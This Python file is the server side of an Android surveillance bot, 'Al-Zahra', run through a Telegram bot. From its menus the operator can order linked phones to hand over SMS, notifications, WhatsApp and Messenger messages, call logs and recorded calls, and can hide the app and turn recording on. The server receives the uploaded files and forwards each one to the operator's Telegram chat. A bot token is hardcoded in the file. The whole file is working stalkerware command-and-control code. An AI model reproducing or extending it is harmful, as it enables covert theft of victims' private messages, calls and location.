#!/usr/bin/env python3
"""
Al-Zahra Bot v4.2 - Complete Server Side
"""

import asyncio
import json
import logging
import os
import random
import time
from datetime import datetime
from aiohttp import web

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('AlZahraBot')

BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443

UPLOAD_DIR = "/opt/alzahra/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ═══════════════════════════════════════════
# تخزين البيانات
# ═══════════════════════════════════════════
class DataStore:
    def __init__(self):
        self.devices = {}
        self.pending_commands = {}
        self.link_codes = {}
        self.device_files = {}
        self.last_update_id = 0

data_store = DataStore()

# ═══════════════════════════════════════════
# وظائف Telegram
# ═══════════════════════════════════════════
async def api_call(method, params=None):
    import aiohttp
    url = f"{API_BASE}/{method}"
    try:
        async with aiohttp.ClientSession() as session:
            if params:
                async with session.post(url, data=params) as resp:
                    return await resp.json()
            else:
                async with session.get(url) as resp:
                    return await resp.json()
    except Exception as e:
        logger.error(f"API error: {e}")
        return None

async def send_message(chat_id, text, reply_markup=None):
    params = {"chat_id": str(chat_id), "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    return await api_call("sendMessage", params)

async def edit_message(chat_id, message_id, text, reply_markup=None):
    params = {"chat_id": str(chat_id), "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    return await api_call("editMessageText", params)

async def answer_callback(query_id, text=None):
    params = {"callback_query_id": query_id}
    if text:
        params["text"] = text
        params["show_alert"] = True
    return await api_call("answerCallbackQuery", params)

async def send_document(chat_id, file_path, caption=""):
    import aiohttp
    url = f"{API_BASE}/sendDocument"
    try:
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("parse_mode", "Markdown")
            data.add_field("document", open(file_path, "rb"))
            async with session.post(url, data=data) as resp:
                return await resp.json()
    except Exception as e:
        logger.error(f"Send document error: {e}")
        return None

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def generate_code():
    return ''.join([str(random.randint(0, 9)) for _ in range(9)])

# ═══════════════════════════════════════════
# لوحات التحكم
# ═══════════════════════════════════════════
def main_menu():
    return {"inline_keyboard": [
        [{"text": "📱 الأجهزة المتصلة", "callback_data": "devices_list"}],
        [{"text": "🔗 ربط جهاز جديد", "callback_data": "link_device"}],
        [{"text": "⚙️ الإعدادات", "callback_data": "settings_main"}],
        [{"text": "📊 حالة النظام", "callback_data": "system_status"}]
    ]}

def devices_menu():
    if not data_store.devices:
        return {"inline_keyboard": [
            [{"text": "🔄 تحديث", "callback_data": "devices_list"}],
            [{"text": "🔙 رجوع", "callback_data": "back_main"}]
        ]}
    
    buttons = []
    for did, info in data_store.devices.items():
        model = info.get("model", "غير معروف")
        status = "🟢" if info.get("online") else "🔴"
        linked = "✅" if info.get("linked") else "⏳"
        buttons.append([{"text": f"{status}{linked} {model}", "callback_data": f"device_{did}"}])
    
    buttons.append([{"text": "🔄 تحديث", "callback_data": "devices_list"}])
    buttons.append([{"text": "🔙 رجوع", "callback_data": "back_main"}])
    return {"inline_keyboard": buttons}

def device_menu(device_id):
    return {"inline_keyboard": [
        [{"text": "📨 سحب SMS", "callback_data": f"cmd_{device_id}_sms"}],
        [{"text": "🔔 سحب الإشعارات", "callback_data": f"cmd_{device_id}_notifications"}],
        [{"text": "💬 سحب واتساب", "callback_data": f"cmd_{device_id}_whatsapp"}],
        [{"text": "📩 سحب ماسنجر", "callback_data": f"cmd_{device_id}_messenger"}],
        [{"text": "📞 سجل المكالمات", "callback_data": f"cmd_{device_id}_calls"}],
        [{"text": "🎙️ المكالمات المسجلة", "callback_data": f"cmd_{device_id}_recordings"}],
        [{"text": "ℹ️ معلومات الجهاز", "callback_data": f"cmd_{device_id}_info"}],
        [{"text": "📦 سحب الكل (ZIP)", "callback_data": f"cmd_{device_id}_all"}],
        [{"text": "🔙 رجوع", "callback_data": "devices_list"}]
    ]}

def settings_menu():
    return {"inline_keyboard": [
        [{"text": "🔐 الصلاحيات", "callback_data": "settings_permissions"}],
        [{"text": "🔒 إخفاء", "callback_data": "settings_hide"}, {"text": "🔓 إظهار", "callback_data": "settings_unhide"}],
        [{"text": "🎙️ تفعيل التسجيل", "callback_data": "settings_record_on"}, {"text": "⏹️ إيقاف", "callback_data": "settings_record_off"}],
        [{"text": "🔙 رجوع", "callback_data": "back_main"}]
    ]}

def permissions_menu():
    return {"inline_keyboard": [
        [{"text": "📨 SMS", "callback_data": "perm_sms_on"}, {"text": "📞 المكالمات", "callback_data": "perm_calls_on"}],
        [{"text": "📍 الموقع", "callback_data": "perm_location_on"}, {"text": "📷 الكاميرا", "callback_data": "perm_camera_on"}],
        [{"text": "🎙️ الميكروفون", "callback_data": "perm_mic_on"}],
        [{"text": "🔙 رجوع", "callback_data": "settings_main"}]
    ]}

# ═══════════════════════════════════════════
# معالجة الأوامر
# ═══════════════════════════════════════════
async def handle_message(message):
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "")
    
    if str(chat_id) != OWNER_CHAT_ID:
        await send_message(chat_id, "⛔ غير مصرح")
        return
    
    if text in ("/start", "/help"):
        await send_message(chat_id, f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}", main_menu())
    
    elif text == "/link":
        code = generate_code()
        while code in data_store.link_codes:
            code = generate_code()
        
        data_store.link_codes[code] = {"chat_id": chat_id, "time": time.time()}
        await send_message(chat_id, f"🔗 *كود الربط*\n\n`{code}`\n\n⏰ صالح 5 دقائق\n📱 أدخله في التطبيق")
    
    elif text == "/devices":
        await show_devices(chat_id)
    
    elif text == "/settings":
        await send_message(chat_id, "⚙️ *الإعدادات*", settings_menu())
    
    elif text == "/status":
        await show_status(chat_id)
    
    else:
        await send_message(chat_id, "❓ استخدم /start")

async def handle_callback(cb):
    chat_id = cb.get("message", {}).get("chat", {}).get("id")
    msg_id = cb.get("message", {}).get("message_id")
    data = cb.get("data", "")
    qid = cb.get("id")
    
    if str(chat_id) != OWNER_CHAT_ID:
        await answer_callback(qid, "⛔ غير مصرح")
        return
    
    # التنقل
    if data == "back_main":
        await edit_message(chat_id, msg_id, f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}", main_menu())
    
    elif data == "devices_list":
        await show_devices(chat_id, msg_id)
    
    elif data == "link_device":
        code = generate_code()
        while code in data_store.link_codes:
            code = generate_code()
        data_store.link_codes[code] = {"chat_id": chat_id, "time": time.time()}
        await edit_message(chat_id, msg_id, f"🔗 *كود الربط*\n\n`{code}`\n\n⏰ صالح 5 دقائق", 
            {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_main"}]]})
    
    elif data == "settings_main":
        await edit_message(chat_id, msg_id, "⚙️ *الإعدادات*", settings_menu())
    
    elif data == "system_status":
        await show_status(chat_id, msg_id)
    
    elif data == "settings_permissions":
        await edit_message(chat_id, msg_id, "🔐 *الصلاحيات*", permissions_menu())
    
    elif data == "settings_hide":
        await answer_callback(qid, "⏳ جاري الإخفاء...")
        await send_message(chat_id, "🔒 تم إرسال أمر الإخفاء")
    
    elif data == "settings_unhide":
        await answer_callback(qid, "⏳ جاري الإظهار...")
        await send_message(chat_id, "🔓 تم إرسال أمر الإظهار")
    
    elif data == "settings_record_on":
        await answer_callback(qid, "✅ تم التفعيل")
        await send_message(chat_id, "🎙️ تم تفعيل التسجيل")
    
    elif data == "settings_record_off":
        await answer_callback(qid, "⏹️ تم الإيقاف")
        await send_message(chat_id, "⏹️ تم إيقاف التسجيل")
    
    # الأجهزة
    elif data.startswith("device_"):
        did = data[7:]
        if did in data_store.devices:
            info = data_store.devices[did]
            text = f"📱 *{info.get('model', 'غير معروف')}*\n\n"
            text += f"🤖 Android {info.get('android', 'N/A')}\n"
            text += f"الحالة: {'🟢 متصل' if info.get('online') else '🔴 غير متصل'}\n"
            text += f"الربط: {'✅' if info.get('linked') else '⏳'}\n"
            text += f"آخر اتصال: {info.get('last_seen', 'N/A')}"
            await edit_message(chat_id, msg_id, text, device_menu(did))
        else:
            await answer_callback(qid, "❌ الجهاز غير متصل")
    
    # أوامر الجهاز
    elif data.startswith("cmd_"):
        parts = data.split("_", 2)
        if len(parts) >= 3:
            did, action = parts[1], parts[2]
            if did in data_store.devices:
                await answer_callback(qid, f"⏳ جاري الإرسال...")
                if did not in data_store.pending_commands:
                    data_store.pending_commands[did] = []
                data_store.pending_commands[did].append(action)
                await send_message(chat_id, f"✅ تم إرسال: {action}")
            else:
                await answer_callback(qid, "❌ الجهاز غير متصل")
    
    else:
        await answer_callback(qid, "❓ أمر غير معروف")

async def show_devices(chat_id, msg_id=None):
    if not data_store.devices:
        text = "📱 *الأجهزة*\n\n❌ لا توجد أجهزة"
    else:
        text = "📱 *الأجهزة المتصلة*\n\n"
        for did, info in data_store.devices.items():
            status = "🟢" if info.get("online") else "🔴"
            linked = "✅" if info.get("linked") else "⏳"
            text += f"{status}{linked} {info.get('model', 'غير معروف')}\n"
    
    if msg_id:
        await edit_message(chat_id, msg_id, text, devices_menu())
    else:
        await send_message(chat_id, text, devices_menu())

async def show_status(chat_id, msg_id=None):
    try:
        import psutil
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
    except:
        cpu = mem = disk = 0
    
    text = f"📊 *حالة النظام*\n\n💻 CPU: {cpu}%\n🧠 RAM: {mem}%\n💾 Disk: {disk}%\n📱 أجهزة: {len(data_store.devices)}\n⏰ {get_timestamp()}"
    kb = {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_main"}]]}
    
    if msg_id:
        await edit_message(chat_id, msg_id, text, kb)
    else:
        await send_message(chat_id, text, kb)

# ═══════════════════════════════════════════
# استقبال التحديثات
# ═══════════════════════════════════════════
async def get_updates():
    while True:
        try:
            result = await api_call("getUpdates", {
                "offset": data_store.last_update_id + 1,
                "limit": 10,
                "timeout": 30
            })
            
            if result and result.get("ok"):
                for update in result.get("result", []):
                    data_store.last_update_id = update["update_id"]
                    
                    if "message" in update:
                        await handle_message(update["message"])
                    elif "callback_query" in update:
                        await handle_callback(update["callback_query"])
            
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Update error: {e}")
            await asyncio.sleep(5)

# ═══════════════════════════════════════════
# خادم الويب
# ═══════════════════════════════════════════
async def handle_verify_code(request):
    """التحقق من كود الربط"""
    try:
        data = await request.json()
        code = data.get("code", "")
        device_id = data.get("device_id", "")
        model = data.get("model", "Unknown")
        android = data.get("android", "Unknown")
        
        logger.info(f"Verify code: {code} from {model}")
        
        if code not in data_store.link_codes:
            return web.json_response({"status": "error", "message": "كود غير صحيح"})
        
        link_info = data_store.link_codes[code]
        
        if time.time() - link_info["time"] > 300:
            del data_store.link_codes[code]
            return web.json_response({"status": "error", "message": "الكود منتهي"})
        
        # تسجيل الجهاز
        data_store.devices[device_id] = {
            "model": model,
            "android": android,
            "online": True,
            "last_seen": get_timestamp(),
            "linked": True,
            "owner": link_info["chat_id"]
        }
        
        del data_store.link_codes[code]
        
        await send_message(link_info["chat_id"], f"✅ تم ربط جهاز!\n📱 {model}\n🤖 Android {android}")
        
        return web.json_response({"status": "ok", "device_id": device_id})
        
    except Exception as e:
        logger.error(f"Verify error: {e}")
        return web.json_response({"status": "error", "message": "خطأ في الخادم"})

async def handle_register(request):
    try:
        data = await request.json()
        did = data.get("device_id")
        model = data.get("model", "Unknown")
        android = data.get("android", "Unknown")
        
        if did in data_store.devices:
            data_store.devices[did]["online"] = True
            data_store.devices[did]["last_seen"] = get_timestamp()
        else:
            data_store.devices[did] = {
                "model": model, "android": android,
                "online": True, "last_seen": get_timestamp(), "linked": False
            }
        
        return web.json_response({"status": "ok"})
    except Exception as e:
        return web.json_response({"status": "error"})

async def handle_data(request):
    try:
        reader = await request.multipart()
        device_id = None
        data_type = None
        saved_path = None
        
        while True:
            part = await reader.next()
            if part is None:
                break
            
            if part.name == "device_id":
                device_id = await part.text()
            elif part.name == "type":
                data_type = await part.text()
            elif part.name == "file":
                filename = f"{device_id}_{data_type}_{int(time.time())}_{part.filename}"
                saved_path = os.path.join(UPLOAD_DIR, filename)
                
                with open(saved_path, "wb") as f:
                    while True:
                        chunk = await part.read_chunk()
                        if not chunk:
                            break
                        f.write(chunk)
        
        if device_id and data_type:
            if device_id not in data_store.device_files:
                data_store.device_files[device_id] = []
            data_store.device_files[device_id].append({"type": data_type, "path": saved_path})
            
            await send_message(OWNER_CHAT_ID, f"📥 بيانات من {device_id}\n📁 {data_type}")
            
            if saved_path and os.path.exists(saved_path):
                await send_document(OWNER_CHAT_ID, saved_path, f"📱 {device_id} - {data_type}")
        
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.error(f"Data error: {e}")
        return web.json_response({"status": "error"})

async def handle_commands(request):
    try:
        did = request.query.get("device_id", "")
        cmds = data_store.pending_commands.get(did, [])
        data_store.pending_commands[did] = []
        return web.json_response({"commands": cmds})
    except:
        return web.json_response({"commands": []})

async def handle_status(request):
    try:
        data = await request.json()
        did = data.get("device_id")
        if did in data_store.devices:
            data_store.devices[did]["online"] = True
            data_store.devices[did]["last_seen"] = get_timestamp()
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def init_app():
    app = web.Application()
    app.router.add_post("/api/verify_code", handle_verify_code)
    app.router.add_post("/api/register", handle_register)
    app.router.add_post("/api/data", handle_data)
    app.router.add_get("/api/commands", handle_commands)
    app.router.add_post("/api/status", handle_status)
    return app

# ═══════════════════════════════════════════
# التشغيل
# ═══════════════════════════════════════════
async def main():
    logger.info("=" * 50)
    logger.info("  Al-Zahra Bot v4.2 Starting...")
    logger.info("=" * 50)
    
    app = await init_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    logger.info(f"Server on port {PORT}")
    
    async def cleanup():
        while True:
            await asyncio.sleep(60)
            now = time.time()
            expired = [c for c, i in data_store.link_codes.items() if now - i["time"] > 300]
            for c in expired:
                del data_store.link_codes[c]
    
    await asyncio.gather(get_updates(), cleanup())

if __name__ == "__main__":
    asyncio.run(main())
